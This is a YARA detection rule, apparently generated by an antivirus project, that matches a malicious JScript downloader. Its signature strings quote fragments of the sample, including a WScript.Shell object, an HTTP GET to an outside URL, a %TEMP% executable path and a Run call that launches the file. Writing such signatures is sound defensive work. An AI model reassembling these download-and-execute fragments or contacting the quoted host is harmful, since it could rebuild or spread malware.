rule sig_20160328_48bd61bb6ed5db8426fe05f3ecc5402c {
  meta:
    description = "datamaliciousorder - file 20160328_48bd61bb6ed5db8426fe05f3ecc5402c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a8738249112b7dd365651f015fc60245e3bc8c300c2a9a5bc90114ef7fc3989e"

  strings:
    $s1  = "function Jefvtzobvb() {return Cljidqve[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"m1Vcjuk5IKi9.exe\";};" fullword ascii
    $s2  = "Ovrogmsib[Ngodoqcgu](\"GET\", \"http://darjewellery.com/kwo9pa\", false);" fullword ascii
    $s3  = "do {WScript[Ebkosand](Kzgdyrzh() * 11)} while (Ovrogmsib[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Hspmivk(Sjtwwwiegm, Cegkkwfoo){return Sjtwwwiegm - Cegkkwfoo;};" fullword ascii
    $s5  = "var Cljidqve = function Hiiwchs() {return WScript[Tyhoduk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Gqvxx(Otkieqy){Cljidqve[\"Run\"](Otkieqy, Eclyelvwkx, Eclyelvwkx);};" fullword ascii
    $s7  = "function Rfsfe() {return ((Muscgxncre == true) && (Muscgxncre == Abquhopmzm)) ? 1 : Eclyelvwkx;};" fullword ascii
    $s8  = "function Gzbixq(){return Tyhoduk;};" fullword ascii
    $s9  = " while (Smuqzmzf){" fullword ascii
    $s10 = "var Tmluikh = new this[\"Date\"]();" fullword ascii
    $s11 = "Muscgxncre = true; " fullword ascii
    $s12 = "var Muscgxncre = false;" fullword ascii
    $s13 = "Abquhopmzm = true; " fullword ascii
    $s14 = "return Hspmivk(Ubaer, Uwjnxcv);" fullword ascii
    $s15 = "function Czuvgnyxbz(){return Mkynls;};" fullword ascii
    $s16 = "var Lfozu = false;" fullword ascii
    $s17 = "function Rgkbf(Tfzralppe) {var Zytdyivoxk = (1, 2, 3, 4, 5, Tfzralppe); return Zytdyivoxk;};" fullword ascii
    $s18 = "function Bdqkjw()" fullword ascii
    $s19 = "function Kzgdyrzh(){return 22;};" fullword ascii
    $s20 = "var Abquhopmzm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}